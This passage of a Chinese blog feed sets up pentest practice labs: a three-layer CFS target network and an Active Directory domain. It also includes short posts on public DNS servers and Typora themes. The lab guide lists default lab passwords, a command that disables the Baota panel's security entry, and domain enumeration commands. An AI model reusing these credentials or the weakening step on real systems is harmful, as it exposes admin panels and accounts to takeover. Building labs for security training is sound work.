      <title>0x02 - 内网靶场虚拟环境搭建</title>
      <link href="/2022-09-22-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/0x02-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
      <url>/2022-09-22-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/0x02-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="多层内网环境搭建"><a href="#多层内网环境搭建" class="headerlink" title="多层内网环境搭建"></a>多层内网环境搭建</h1><h2 id="网络环境，各主机的IP："><a href="#网络环境，各主机的IP：" class="headerlink" title="网络环境，各主机的IP："></a>网络环境，各主机的IP：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali：192.168.1.200且桥接</span><br><span class="line">centos：</span><br><span class="line">192.168.11.11（如需上网改为桥接）</span><br><span class="line">192.168.22.11</span><br><span class="line">Ubuntu：</span><br><span class="line">192.168.22.22</span><br><span class="line">192.168.33.22</span><br><span class="line">win7：</span><br><span class="line">192.168.33.33</span><br></pre></td></tr></table></figure><h2 id="CFS三层内网靶机安装步骤"><a href="#CFS三层内网靶机安装步骤" class="headerlink" title="CFS三层内网靶机安装步骤"></a>CFS三层内网靶机安装步骤</h2><blockquote><p><a href="">CFS三层靶场搭建参考文章</a></p><p>链接:<a href="https://pan.baidu.com/s/1yVw3NzmrqraFJEgir7TgqQ">https://pan.baidu.com/s/1yVw3NzmrqraFJEgir7TgqQ</a>提取码:74u9</p></blockquote><ol><li>下载环境，导入虚拟机，点击此文件导入</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221517269.png" alt="image-20220922151701185" style="zoom:50%;" /><ol start="2"><li>输入名称及保存路径即可，路径可自行选择，这里我保存至D盘，虚拟机文件文件夹</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221517148.png" alt="image-20220922151739050" style="zoom:50%;" /><p>（同理其他两台机器一样的操作）</p><ol start="3"><li><p>配置虚拟机，虚拟网卡。点击编辑——&gt;点击虚拟网卡编辑器——&gt;点击更改设置——&gt;点击添加网络，分别添加VMnet1，VMnet2，VMnet3三张网卡——&gt;点击虚拟网卡VMnet1，在子网IP处修改IP地址为192.168.11.0，VMnet2为192.168.22.0，VMnet3为192.168.33.0——&gt;右键机器设置给Target1机器配置网络适配器1为桥接模式，网络适配器2为自定义VMnet2，给Target2机器配置网络适配器1为VMnet2，网络适配器2为VMnet3，给Target3机器配置网络适配器1为VMnet3。</p></li><li><p>开启虚拟器Target1，输入账号root 密码teamssix.com进入系统查看宝塔是否正常运行（进入系统后可输入init 切换为图形界面）</p></li><li><p>正常则使用本地机器访问宝塔后台地址IP：8888</p></li></ol><blockquote><p>产生如下提示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">请使用正确的入口登录面板</span><br><span class="line">错误原因：当前宝塔新安装的已经开启了安全入口登录，新装机器都会随机一个8位字符的安全入口名称，亦可以在面板设置处修改，如您没记录或不记得了，可以使用以下方式解决</span><br><span class="line">解决方法：在SSH终端输入以下一种命令来解决</span><br><span class="line">1.查看面板入口：/etc/init.d/bt default</span><br><span class="line">2.关闭安全入口：rm -f /www/server/panel/data/admin_path.pl</span><br><span class="line">注意：【关闭安全入口】将使您的面板登录地址被直接暴露在互联网上，非常危险，请谨慎操作</span><br></pre></td></tr></table></figure><p>运行&#x2F;etc&#x2F;init.d&#x2F;bt default后，查看其登陆地址及密码</p><p>宝塔后台登陆地址及密码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">地址：http\://Target1-ip:8888/a768f109/ </span><br><span class="line">账号：eaj3yhsl </span><br><span class="line">密码：41bb8fee</span><br></pre></td></tr></table></figure><p>配置网站绑定域名，进入后点击网站——&gt;设置——&gt;点击域名管理——&gt;输入Target1-ip(此处输入Target1机器IP地址)输入完成后点击添加——&gt;返回即可访问web页面</p></blockquote><ol start="6"><li>Target2机器web页面同理设置只是ip地址发生变化</li></ol><blockquote><p>宝塔后台登陆地址及密码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">地址：http\://Target2-IP:8888/2cc52ec0/ </span><br><span class="line">账号：xdynr37d </span><br><span class="line">密码：123qwe..</span><br></pre></td></tr></table></figure></blockquote><p>靶场搭建完毕~~</p><h1 id="内网域环境搭建"><a href="#内网域环境搭建" class="headerlink" title="内网域环境搭建"></a>内网域环境搭建</h1><h2 id="系统角色IP"><a href="#系统角色IP" class="headerlink" title="系统角色IP"></a>系统角色IP</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IP配置：</span><br><span class="line">Windows Server 2012 R2：</span><br><span class="line">域控-192.168.1.1</span><br><span class="line">Windows Server 2008 R2：</span><br><span class="line">域成员-192.168.1.2</span><br><span class="line">Windows 7：</span><br><span class="line">域成员-192.168.1.3</span><br><span class="line">三台主机都要查看IP和设置固定IP地址（域中IP是固定的）</span><br><span class="line"></span><br><span class="line">DNS配置：（域成员DNS指向域控IP）</span><br><span class="line">需要注意的是，由于 Windows 7 和 Windows Server 2008 R2 是作为域中的成员主机，所以要设置首先DNS服务器为 Windows Server 2012 的 ip 地址192.168.1.1，也就是域控的地址。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">下面笔记使用下面的IP：</span><br><span class="line">也可以改成10.10.10.1网段的IP配置：</span><br><span class="line">Windows Server 2012 R2：</span><br><span class="line">域控-10.10.10.10</span><br><span class="line">Windows Server 2008 R2：</span><br><span class="line">域成员-10.10.10.20</span><br><span class="line">Windows 7：</span><br><span class="line">域成员-10.10.10.30</span><br></pre></td></tr></table></figure><blockquote><ul><li><p><a href="https://mp.weixin.qq.com/s?__biz=MzI5MTA1ODk5NQ==&amp;mid=2247484151&amp;idx=1&amp;sn=f1e95bb472fbe2793a213a2e2d7f4ec3&amp;chksm=ec1726abdb60afbd53b23904b2bda21098ed6d0f4b2ae1748c00182e8d5e6656707a4dac35da&amp;scene=21#wechat_redirect">https://mp.weixin.qq.com/s?__biz=MzI5MTA1ODk5NQ==&amp;mid=2247484151&amp;idx=1&amp;sn=f1e95bb472fbe2793a213a2e2d7f4ec3&amp;chksm=ec1726abdb60afbd53b23904b2bda21098ed6d0f4b2ae1748c00182e8d5e6656707a4dac35da&amp;scene=21#wechat_redirect</a></p></li><li><p><a href="https://www.cnblogs.com/jassa/p/10170386.html">https://www.cnblogs.com/jassa/p/10170386.html</a></p></li><li><p><a href="https://www.cnblogs.com/-qing-/p/11193805.html">https://www.cnblogs.com/-qing-/p/11193805.html</a></p></li><li><p><a href="https://blog.csdn.net/xia739635297/article/details/104081650/">https://blog.csdn.net/xia739635297/article/details/104081650/</a></p></li></ul></blockquote><h2 id="系统下载"><a href="#系统下载" class="headerlink" title="系统下载"></a>系统下载</h2><ul><li>Windows Server 2012 R2</li></ul><blockquote><p>镜像下载：</p><p>ed2k:&#x2F;&#x2F;|file|cn_windows_server_2012_r2_vl_with_update_x64_dvd_6052729.iso|5545527296|BD499EBCABF406AB82293DD8A5803493|&#x2F;</p></blockquote><ul><li>Windows Server 2008 R2</li></ul><blockquote><p>镜像下载：</p><p>ed2k:&#x2F;&#x2F;|file|cn_windows_server_2008_r2_standard_enterprise_datacenter_and_web_with_sp1_x64_dvd_617598.iso|3368839168|D282F613A80C2F45FF23B79212A3CF67|&#x2F;</p></blockquote><ul><li>Windows 7 SP1</li></ul><blockquote><p>镜像下载：</p><p>ed2k:&#x2F;&#x2F;|file|cn_windows_7_enterprise_with_sp1_x64_dvd_u_677685.iso|3265574912|E9DB2607EA3B3540F3FE2E388F8C53C4|&#x2F;</p></blockquote><blockquote><p>Windows Server 2008 R2 和 Windows 7 SP1 安装 vmtools 需要安装补丁：</p><p><a href="https://www.catalog.update.microsoft.com/search.aspx?q=kb4474419">https://www.catalog.update.microsoft.com/search.aspx?q=kb4474419</a></p><p>Windows Server 2012 R2 安装 vmtools 需要安装补丁：</p><p><a href="https://www.catalog.update.microsoft.com/Search.aspx?q=kb2919355">https://www.catalog.update.microsoft.com/Search.aspx?q=kb2919355</a></p></blockquote><h2 id="系统配置"><a href="#系统配置" class="headerlink" title="系统配置"></a>系统配置</h2><h3 id="DC"><a href="#DC" class="headerlink" title="DC"></a>DC</h3><p>Windows Server 2012 R2 作为域控制器，安装 AD 域及 DNS 服务器在新建域时，本地 Administrator 账户将成为域 Administrator 账户</p><p>域控的功能：为域内的所有机器统一分配杀毒软件和执行任务，当执行杀毒软件时，需要执行域管理者的权限</p><h4 id="网络"><a href="#网络" class="headerlink" title="网络:"></a>网络:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IP地址：10.10.10.10</span><br><span class="line">网关：10.10.10.1</span><br><span class="line">首选DNS：127.0.0.1</span><br><span class="line"></span><br><span class="line">我们再次查看下IP，可以看到首选 DNS 服务器已经设置成 127.0.0.1 ，也就是域控制器自己，如果需要上网，可以把备用DNS服务器设置成之前的值，如下所示：</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221521303.png" alt="image-20220922152143216" style="zoom:50%;" /><h4 id="桌面图标设置"><a href="#桌面图标设置" class="headerlink" title="桌面图标设置:"></a>桌面图标设置:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">win + r</span><br><span class="line">rundll32.exe shell32.dll,Control_RunDLL desk.cpl,,0</span><br></pre></td></tr></table></figure><h4 id="安装域"><a href="#安装域" class="headerlink" title="安装域"></a>安装域</h4><h5 id="修改计算机名为-DC"><a href="#修改计算机名为-DC" class="headerlink" title="修改计算机名为 DC"></a>修改计算机名为 DC</h5><p>win + r 输入 sysdm.cpl 打开系统属性窗口，点击 更改 重命名此计算机为 DC ，点击确定，重启。</p><h5 id="添加角色和功能"><a href="#添加角色和功能" class="headerlink" title="添加角色和功能"></a>添加角色和功能</h5><p>打开服务器管理器，在仪表板选择添加角色和功能，进入 添加角色和功能向导：</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221522780.png" alt="image-20220922152224671" style="zoom:50%;" /><blockquote><ul><li>开始之前 -&gt; 下一步</li><li>安装类型 -&gt; 基于角色或基于功能的安装（默认） -&gt; 下一步</li><li>服务器选择 -&gt; 从服务器池中选择服务器（默认） -&gt; 下一步</li><li>服务器角色 -&gt; 勾选 Active Directory 域服务 -&gt; 添加功能 -&gt; 下一步</li></ul><blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221523399.png" alt="image-20220922152318312" style="zoom:33%;" /><p>Active Directory  域服务(AD DS)存储有关网络上的对象的信息，并向用户和网络管理员提供这些信息， AD DS  使用域控制器，向网络用户授予通过单个登录进程访问网络上任意位置的允许资源的权限。</p><p>注意：这里的 DNS  服务器可勾选，也可不勾选，在安装时，是会默认安装的。</p></blockquote><ul><li>功能 -&gt; 默认 -&gt; 下一步</li><li>AD DS -&gt; 下一步</li></ul><blockquote><p>**Active Directory 域服务(AD DS)**存储有关网络上的用户、计算机和其他设备的信息。 AD DS 有助于管理员安全地管理该信息，并有助于用户间的资源共享和协作。启用目录的应用程序（例如Microsoft Exchange Server )和其他 Windows Server 技术（例如组策略）也需要 AD DS 。</p></blockquote><p>注意事项：</p><blockquote><ul><li><p>· 若要有助于确保在某台服务器中断的情况下用户仍然可以登录到网络，请至少为域安装两个域控制（预防单点故障）</p></li><li><p>· AD DS 要求将 DNS 服务器安装在网络上。如果未安装 DNS 服务器，系统会提示你在该计算机上安装DNS 服务器角色。</p></li><li><p>· 安装 AD DS 还将安装 AD DS 所需的 DFS 命名空间、 DFS 复制和文件复制服务。（Microsoft文件分布系统 (Dfs) 是一个网络服务器组件，它能够使你更容易地在网络上查询和管理数据）</p></li></ul></blockquote><ul><li>确认 -&gt; 安装</li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221525836.png" alt="image-20220922152507751" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221525707.png" alt="image-20220922152514621" style="zoom:50%;" /><blockquote><p>导出配置设置 DeploymentConfigTemplate.xml ，即可在 powershell 中执行如下命令进行相同的安装</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Install-WindowsFeature</span> <span class="literal">-ConfigurationFilePath</span> DeploymentConfigTemplate.xml</span><br></pre></td></tr></table></figure></blockquote><ul><li>结果 -&gt; 等待安装完成，点击 将此服务器提升为域控制器</li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221527028.png" alt="image-20220922152715934" style="zoom:50%;" /></blockquote><h5 id="进入-Active-Directory-域服务配置向导-："><a href="#进入-Active-Directory-域服务配置向导-：" class="headerlink" title="进入 Active Directory 域服务配置向导 ："></a>进入 Active Directory 域服务配置向导 ：</h5><blockquote><ul><li>部署配置 -&gt; 添加新林 -&gt; 填写根域名 mingy.local -&gt; 下一步</li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221527468.png" alt="image-20220922152731383" style="zoom:50%;" /><ul><li>域控制器选项 -&gt; 输入目录服务还原模式(DSRM)密码 -&gt; 此密码可以与 Administrator 账号密码不一致 -&gt; 下一步</li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221527501.png" alt="image-20220922152743410" style="zoom:50%;" /><ul><li>DNS 选项 -&gt; 默认 -&gt; 下一步</li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221527992.png" alt="image-20220922152752902" style="zoom:50%;" /><ul><li>其他选项 -&gt; NetBIOS 域名 MINGY （默认） -&gt; 下一步</li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221528433.png" alt="image-20220922152807338" style="zoom:50%;" /><ul><li>路径 -&gt; 指定 AD DS 数据库、日志文件和 SYSVOL 的位置（默认） -&gt; 下一步</li></ul><blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数据库文件夹：C:\Windows\NTDS</span><br><span class="line">日志文件文件夹：C:\Windows\NTDS</span><br><span class="line">SYSVOL文件夹：C:\Windows\SYSVOL</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221528977.png" alt="image-20220922152848885" style="zoom:50%;" /></blockquote><ul><li>查看选项 -&gt; 默认 -&gt; 下一步</li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221529605.png" alt="image-20220922152900516" style="zoom:50%;" /><blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#</span><br><span class="line"># 用于 AD DS 部署的 Windows PowerShell 脚本</span><br><span class="line">#</span><br><span class="line">Import-Module ADDSDeployment</span><br><span class="line">Install-ADDSForest `</span><br><span class="line">-CreateDnsDelegation:$false `</span><br><span class="line">-DatabasePath &quot;C:\Windows\NTDS&quot; `</span><br><span class="line">-DomainMode &quot;Win2012R2&quot; `</span><br><span class="line">-DomainName &quot;gungnir.top&quot; `</span><br><span class="line">-DomainNetbiosName &quot;GUNGNIR&quot; `</span><br><span class="line">-ForestMode &quot;Win2012R2&quot; `</span><br><span class="line">-InstallDns:$true `</span><br><span class="line">-LogPath &quot;C:\Windows\NTDS&quot; `</span><br><span class="line">-NoRebootOnCompletion:$false `</span><br><span class="line">-SysvolPath &quot;C:\Windows\SYSVOL&quot; `</span><br><span class="line">-Force:$true</span><br></pre></td></tr></table></figure></blockquote><ul><li>先决条件检查 -&gt; 安装 -&gt; 安装完成后会重启</li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221529088.png" alt="image-20220922152927992" style="zoom:50%;" /><ul><li>重启后在输入账号密码处，可以看到账号名称变为了 MINGY\Administrator</li></ul><blockquote><p>登录一个域，需要在账号前面加上域名称和斜杠</p><p>登录本地账号，需要输入 .\administrator 来登录</p></blockquote><ul><li>登录后可以在服务器管理器中看到新增的 AD DS 和 DNS 服务器</li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221529036.png" alt="image-20220922152942944" style="zoom:50%;" /></blockquote><blockquote><p><a href="http://go.microsoft.com/fwlink/?LinkId=219491">http://go.microsoft.com/fwlink/?LinkId=219491</a></p></blockquote><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><p>Windows Server 2008 R2 作为 WEB 服务器，安装 WEB 应用，加入域</p><h4 id="网络："><a href="#网络：" class="headerlink" title="网络："></a>网络：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IP地址：10.10.10.20</span><br><span class="line">网关：10.10.10.1</span><br><span class="line">首选DNS：10.10.10.10</span><br></pre></td></tr></table></figure><h4 id="加入-gungnir-top-域"><a href="#加入-gungnir-top-域" class="headerlink" title="加入 gungnir.top 域"></a>加入 gungnir.top 域</h4><blockquote><ol><li>win + r 输入 sysdm.cpl 进入系统属性窗口，选择更改</li><li>修改计算机名为： WEB</li><li>修改隶属于：域 gungnir.top</li><li>点击确定，需要输入域管理员的账号密码</li><li>加入域成功，需要重启计算机</li></ol></blockquote><blockquote><p> 计算机全名 WEB.mingy.local</p></blockquote><h3 id="PC"><a href="#PC" class="headerlink" title="PC"></a>PC</h3><h4 id="网络：-1"><a href="#网络：-1" class="headerlink" title="网络："></a>网络：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IP地址：10.10.10.30</span><br><span class="line">网关：10.10.10.1</span><br><span class="line">首选DNS：10.10.10.10</span><br></pre></td></tr></table></figure><h4 id="加入-gungnir-top-域-1"><a href="#加入-gungnir-top-域-1" class="headerlink" title="加入 gungnir.top 域"></a>加入 gungnir.top 域</h4><blockquote><ol><li>win + r 输入 sysdm.cpl 进入系统属性窗口，选择更改</li><li>修改计算机名为： PC</li><li>修改隶属于：域 gungnir.top</li><li>点击确定，需要输入域管理员的账号密码</li><li>加入域成功，需要重启计算机</li></ol></blockquote><blockquote><p>计算机全名 PC.gungnir.top</p></blockquote><h2 id="域内主机及用户管理"><a href="#域内主机及用户管理" class="headerlink" title="域内主机及用户管理"></a>域内主机及用户管理</h2><p>域中一些简单命令：</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">//查看域内用户</span><br><span class="line">net user /domain</span><br><span class="line">//查看域管理员</span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;domain admins&quot;</span> /domain</span><br></pre></td></tr></table></figure><ol><li><code>win + r 输入 dsa.msc</code> 进入 Active Direcotry 用户和计算机窗口</li></ol><p>或者：点击开始–&gt;管理工具–&gt;双击 Active Directory 用户和计算机</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221536680.png" alt="image-20220922153638598" style="zoom:50%;" /><ol start="2"><li>选择gungnir.top下的 Computers ，可以查看之前添加到域内的两台计算机</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221536610.png" alt="image-20220922153653541" style="zoom:50%;" /><ol start="3"><li>加入域后，需要有域账号才能登录域内主机，我们先创建两个部门，分别为运维部和行政部，右键选择gungnir.top-&gt; 新建 -&gt; 组织单位</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221537182.png" alt="image-20220922153706094" style="zoom:50%;" /><ol start="4"><li>在运维部中新建用户 john</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221537741.png" alt="image-20220922153721647" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221537775.png" alt="image-20220922153737676" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221537972.png" alt="image-20220922153745863" style="zoom:50%;" /><ol start="5"><li>在行政部中新建用户 bob</li></ol><p>步骤同上</p><ol start="6"><li>在 WEB.gungnir.top 计算机登录 john 账号</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gungnir\john</span><br><span class="line">1qaz@WSX</span><br></pre></td></tr></table></figure><ol start="7"><li>在 PC.mingy.local 计算机登录 bob 账号</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gungnir\bob</span><br><span class="line">1qaz@WSX</span><br></pre></td></tr></table></figure><h2 id="vmware网络配置"><a href="#vmware网络配置" class="headerlink" title="vmware网络配置"></a>vmware网络配置</h2><h3 id="仅主机模式"><a href="#仅主机模式" class="headerlink" title="仅主机模式"></a>仅主机模式</h3><p>实质原理：在Host-Only模式下，虚拟网络是一个全封闭的网络，它唯一能够访问的就是主机。其实Host-Only网络和NAT网络很相似，不同的地方就是 Host-Only网络没有NAT服务，所以虚拟网络不能连接到Internet。主机和虚拟机之间的通信是通过VMwareNetworkAdepterVMnet1虚拟网卡来实现的。</p><ul><li>网络拓扑如下</li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221538227.png" alt="image-20220922153854140" style="zoom:50%;" /><ul><li>配置步骤</li></ul><p>1、点“编辑”设置“虚拟网络编辑器”，可以设置DHCP的起始范围。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221539342.png" alt="image-20220922153956221" style="zoom:50%;" /><p>2、设置虚拟机为Host-Only模式。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221540726.png" alt="image-20220922154008639" style="zoom:50%;" /><p>3、设置网卡文件vim &#x2F;etc&#x2F;network&#x2F;interfaces</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221540663.png" alt="image-20220922154018569" style="zoom:50%;" /><p>4、保存退出，然后重启网络服务 systemctl restart networking</p><h3 id="桥接模式"><a href="#桥接模式" class="headerlink" title="桥接模式"></a>桥接模式</h3><p>桥接模式可以简单理解为通过物理主机网卡架设了一座桥，从而连入到了实际网络中。因此，虚拟机可以被分配与物理主机相同网段的独立IP，所有网络功能和网络中的真实机器几乎完全一样。桥接模式下的虚拟机和网内真实计算机所处的位置是一样的。在Bridged模式下，电脑设备创建的虚拟机就像一台真正的计算机一样，它会直接连接到实际的网络上，上网与宿主机（电脑设备）没有联系。Bridged网络类型的原理逻辑图下图所示。所以，现在是不是可以理解 在虚拟网卡中 没有 VMware Network AdepterVMnet0 了 ，因为它就是 宿主机 所在局域网 中的另外一台主机。</p><ul><li>拓扑图</li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221540493.png" alt="image-20220922154036421" style="zoom:50%;" /><ul><li>配置步骤：</li></ul><p>1、点击“编辑虚拟机设置”来设置网卡模式。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221540165.png" alt="image-20220922154047072" style="zoom:50%;" /><p>2、如想配置静态地址则可打开 vim &#x2F;etc&#x2F;network&#x2F;interfaces 进行配置</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221540009.png" alt="image-20220922154057911" style="zoom:50%;" /><p>3、在配置dns解析服务器使用命令打开 vi &#x2F;etc&#x2F;resolv.conf</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221541185.png" alt="image-20220922154106114" style="zoom:50%;" /><h3 id="NAT模式"><a href="#NAT模式" class="headerlink" title="NAT模式"></a>NAT模式</h3><p>NAT（地址转换）</p><p>NAT（Network Address Translation），网络地址转换，NAT模式是比较简单的实现虚拟机上网的方式，NAT模式的虚拟机就是通过宿主机（物理电脑）上网和交换数据的。 这种模式也是使用Vmware虚拟机最常用的模式。在NAT模式下，虚拟机的网卡连接到宿主机的VMnet8上（安装完Vmware虚拟机会多出两个虚拟网卡Vmware1和Vmware8）。此时系统的VMware NAT Service服务就充当了路由器，负责将虚拟机发到VMnet8的包进行地址转换之后发到实际的网络上，再将实际网络上返回的包进行地址转换后通过VMnet8发送给虚拟机。VMware DHCP Service负责为虚拟机分配IP地址。NAT网络类型的原理逻辑图如下图所示。</p><ul><li>拓扑图</li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221541649.png" alt="image-20220922154124574" style="zoom:50%;" /><ul><li>配置步骤：</li></ul><p>1、kali如果使用dhcp则可不进行配置</p><p>2、配置静态ip：</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221541998.png" alt="image-20220922154132900" style="zoom:50%;" />]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 内网 </category>
          
          <category> 内网靶场 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DNS</title>
      <link href="/2022-09-22-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%BA%94%E7%94%A8%E5%B1%82/DNS/"/>
      <url>/2022-09-22-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%BA%94%E7%94%A8%E5%B1%82/DNS/</url>
      
        <content type="html"><![CDATA[<h1 id="常用DNS-服务器"><a href="#常用DNS-服务器" class="headerlink" title="常用DNS 服务器"></a>常用DNS 服务器</h1><h2 id="233-5-5-5阿里云223-5-5-5-x2F-223-6-6-6"><a href="#233-5-5-5阿里云223-5-5-5-x2F-223-6-6-6" class="headerlink" title="233.5.5.5阿里云223.5.5.5 &#x2F; 223.6.6.6"></a>233.5.5.5阿里云223.5.5.5 &#x2F; 223.6.6.6</h2><blockquote><ul><li>稳定(Stable)</li></ul><p>全球数百台服务器组成的集群,充足的带宽资源<br>自研高性能DNS系统和清洗中心，保障系统稳定和安全</p><ul><li>快速(Speedy)</li></ul><p>BGP anycast技术，让您访问最近的DNS集群<br>动态缓存技术，加速解析响应</p><ul><li>智能(Smart)</li></ul><p>精确的IP区域划分，解析结果更准确<br>即将支持edns-client-subnet 技术,调度精准</p><ul><li>稳定(Stable)</li></ul><p>全球数百台服务器组成的集群,充足的带宽资源<br>自研高性能DNS系统和清洗中心，保障系统稳定和安全</p><ul><li>快速(Speedy)</li></ul><p>BGP anycast技术，让您访问最近的DNS集群<br>动态缓存技术，加速解析响应</p><ul><li>智能(Smart)</li></ul><p>精确的IP区域划分，解析结果更准确<br>即将支持edns-client-subnet 技术,调度精准</p></blockquote><h2 id="114-DNS：114-114-114-114"><a href="#114-DNS：114-114-114-114" class="headerlink" title="114 DNS：114.114.114.114"></a>114 DNS：114.114.114.114</h2><blockquote><ul><li>114DNS 的优势：</li></ul><p>高速 电信联通移动全国通用DNS，能引导您到最快的网站，手机和计算机都可用<br>稳定 DNS解析成功率超高，与默认DNS相比，使用114DNS可访问国内外更多的网站<br>可靠 3000万个家庭和企业DNS的后端技术支持，多次为电信运营商提供DNS灾备</p><ul><li>114DNS 的特色：</li></ul><p>纯净 无劫持 无需再忍受被强扭去看广告或粗俗网站之痛苦<br>拦截 钓鱼病毒木马网站 增强网银、证券、购物、游戏、隐私信息安全<br>学校或家长可选拦截 色情网站 保护少年儿童免受网络色情内容的毒害</p></blockquote><h2 id="8-8-8-8谷歌"><a href="#8-8-8-8谷歌" class="headerlink" title="8.8.8.8谷歌"></a>8.8.8.8谷歌</h2>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
          <category> 应用层 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Typora教程</title>
      <link href="/2022-09-21-%E7%9F%A5%E8%AF%86/Notes/Typora%E6%95%99%E7%A8%8B/"/>
      <url>/2022-09-21-%E7%9F%A5%E8%AF%86/Notes/Typora%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>Typora 是一款<strong>支持实时预览的 Markdown 文本编辑器</strong>。它有 OS X、Windows、Linux 三个平台的版本，并且是<strong>完全免费</strong>的。</p><h1 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h1><blockquote><ul><li>Typora官网主题: <strong><a href="https://theme.typora.io/">https://theme.typora.io/</a></strong></li><li>为 Typora 编写自定义主题: <strong><a href="https://theme.typora.io/doc/Write-Custom-Theme/">https://theme.typora.io/doc/Write-Custom-Theme/</a></strong></li></ul></blockquote><h2 id="安装主题方法"><a href="#安装主题方法" class="headerlink" title="安装主题方法"></a>安装主题方法</h2><ul><li>通过<code>文件 -&gt; 偏好设置 -&gt; 打开主题文件夹</code>打开theme目录</li><li>复制你想要的对应主题名称<code>*.css</code>后缀文件 到<code>theme</code>目录下然后重启, 选择菜单 -&gt; 主题</li></ul><h2 id="推荐主题"><a href="#推荐主题" class="headerlink" title="推荐主题"></a>推荐主题</h2><blockquote><p>去官网下载</p></blockquote><ol><li>Drake</li></ol><blockquote><p><a href="https://github.com/liangjingkanji/DrakeTyporaTheme">https://github.com/liangjingkanji/DrakeTyporaTheme</a></p></blockquote><ol start="2"><li>Night New</li><li>aspartate</li><li>cobalt</li><li>dyzj-dark</li><li>gitbook</li><li>haru</li><li>lanyue</li><li>mo</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209220113581.png" alt="image-20220922011346401" style="zoom:50%;" />]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
          <category> Notes </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>考核题</title>
